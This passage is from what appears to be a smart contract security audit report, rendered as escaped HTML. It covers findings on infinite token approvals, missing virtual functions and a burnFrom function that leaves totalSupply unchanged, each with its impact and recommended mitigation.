6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUsers and developers may believe they are enforcing a strict real-world window for transaction validity, but in reality, the transaction may be included much later than intended.\u003c/li\u003e\n\u003cli\u003eThis can lead to unexpected execution, stale pricing, or MEV exploitation if the transaction sits in the mempool for an extended period.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-37\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-37\" aria-label=\"recommended mitigation steps 37 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIf the intent is to enforce a real-world time window, the contract should:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAccept a client-supplied timestamp of when the transaction was initiated and compare \u003ccode\u003eblock.timestamp\u003c/code\u003e to that value plus the allowed window.\u003c/li\u003e\n\u003cli\u003eAlternatively, use off-chain logic to cancel or replace transactions that are not mined within the desired time frame.\u003c/li\u003e\n\u003cli\u003eAt minimum, document this limitation in the contract and user documentation to avoid misunderstanding.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"08-widespread-use-of-infinite-token-approvals\" style=\"position:relative;\"\u003e\u003ca href=\"#08-widespread-use-of-infinite-token-approvals\" aria-label=\"08 widespread use of infinite token approvals permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[08] Widespread use of infinite token approvals\u003c/h2\u003e\n\u003cp\u003eThe protocol makes extensive use of infinite token approvals (\u003ccode\u003etype(uint256).max\u003c/code\u003e) across multiple contracts. While this is a common pattern in DeFi to save gas on repeated approvals, it can pose risks with certain token implementations. Examples include:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eBondingTax.sol:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"140\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eforceApprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAgentMigrator.sol:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"141\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAgentFactory.sol:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"142\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAeroAdaptor.sol:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"143\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eforceApprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-21\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-21\" aria-label=\"impact 21 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eSome ERC20 tokens (like COMP) may downcast the approval value to a smaller type (e.g., \u003ccode\u003euint96\u003c/code\u003e) rather than treating it as infinite. This can lead to:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003ePotential transaction failures if tokens downcast the approval value.\u003c/li\u003e\n\u003cli\u003eIncreased risk if a spender contract is compromised, as they have unlimited approval.\u003c/li\u003e\n\u003cli\u003eUnnecessary exposure to risk when large approvals aren’t needed.\u003c/li\u003e\n\u003cli\u003eGas wastage when approvals need to be reset due to downcasting.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-38\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-38\" aria-label=\"recommended mitigation steps 38 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eUse exact approval amounts instead of \u003ccode\u003etype(uint256).max\u003c/code\u003e where possible.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIf infinite approvals are necessary for gas optimization:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAdd a function to revoke approvals when they’re no longer needed.\u003c/li\u003e\n\u003cli\u003eDocument which tokens are known to be compatible/incompatible.\u003c/li\u003e\n\u003cli\u003eConsider implementing approval amount checks for known problematic tokens.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eFor critical operations, consider implementing a pattern where approvals are set and used in the same transaction.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"09-missing-virtual-functions-for-inheritance\" style=\"position:relative;\"\u003e\u003ca href=\"#09-missing-virtual-functions-for-inheritance\" aria-label=\"09 missing virtual functions for inheritance permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[09] Missing \u003ccode\u003evirtual\u003c/code\u003e functions for inheritance\u003c/h2\u003e\n\u003cp\u003eSeveral internal functions across the codebase that are likely to need customization in derived contracts are not marked as \u003ccode\u003evirtual\u003c/code\u003e. This limits the ability to properly override these functions in inherited contracts and could force developers to duplicate code instead of extending it.\u003c/p\u003e\n\u003cp\u003eExample patterns that should be \u003ccode\u003evirtual\u003c/code\u003e include:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eInternal hooks for token operations\u003c/li\u003e\n\u003cli\u003eState modification functions\u003c/li\u003e\n\u003cli\u003eValidation functions\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"impact-22\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-22\" aria-label=\"impact 22 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eReduced code reusability.\u003c/li\u003e\n\u003cli\u003ePotential code duplication in derived contracts.\u003c/li\u003e\n\u003cli\u003eIncreased maintenance burden when changes are needed.\u003c/li\u003e\n\u003cli\u003eRisk of bugs when developers are forced to copy and modify code instead of properly inheriting.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-39\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-39\" aria-label=\"recommended mitigation steps 39 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eAudit internal functions and mark appropriate ones as \u003ccode\u003evirtual\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAdd proper documentation for overrideable functions.\u003c/li\u003e\n\u003cli\u003eConsider creating explicit hooks for key operations.\u003c/li\u003e\n\u003cli\u003eFollow the Open-Closed Principle: design for extension.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"10-totalsupply-not-updated-on-burning-in-ferc20\" style=\"position:relative;\"\u003e\u003ca href=\"#10-totalsupply-not-updated-on-burning-in-ferc20\" aria-label=\"10 totalsupply not updated on burning in ferc20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[10] \u003ccode\u003etotalSupply\u003c/code\u003e not updated on burning in \u003ccode\u003eFERC20\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eThe \u003ccode\u003eFERC20\u003c/code\u003e contract’s \u003ccode\u003eburnFrom\u003c/code\u003e function reduces the user’s balance but does not decrease \u003ccode\u003e_totalSupply\u003c/code\u003e. This breaks ERC20 compliance and causes \u003ccode\u003etotalSupply()\u003c/code\u003e to report incorrect values after burns.\u003c/p\u003e\n\u003cp\u003eThe root cause is in the \u003ccode\u003eburnFrom\u003c/code\u003e function implementation:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"144\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis function only modifies the user’s balance but fails to update the \u003ccode\u003etotalSupply\u003c/code\u003e, unlike standard ERC20 implementations where burning tokens should reduce both the user’s balance and the \u003ccode\u003etotalSupply\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"impact-23\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-23\" aria-label=\"impact 23 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eInaccurate token economics: the reported \u003ccode\u003etotalSupply\u003c/code\u003e will be higher than the actual circulating supply.\u003c/li\u003e\n\u003cli\u003eExternal systems relying on correct supply data will malfunction.\u003c/li\u003e\n\u003cli\u003ePotential price manipulation: artificially inflated supply metrics could affect token valuation.\u003c/li\u003e\n\u003cli\u003eBroken integrations: systems that rely on the total supply for calculations (e.g., voting power, rewards) will use incorrect values.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-40\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-40\" aria-label=\"recommended mitigation steps 40 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eUpdate the \u003ccode\u003eburnFrom\u003c/code\u003e function to decrease the \u003ccode\u003e_totalSupply\u003c/code\u003e when burning tokens:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"145\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Add this line to update total supply\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan 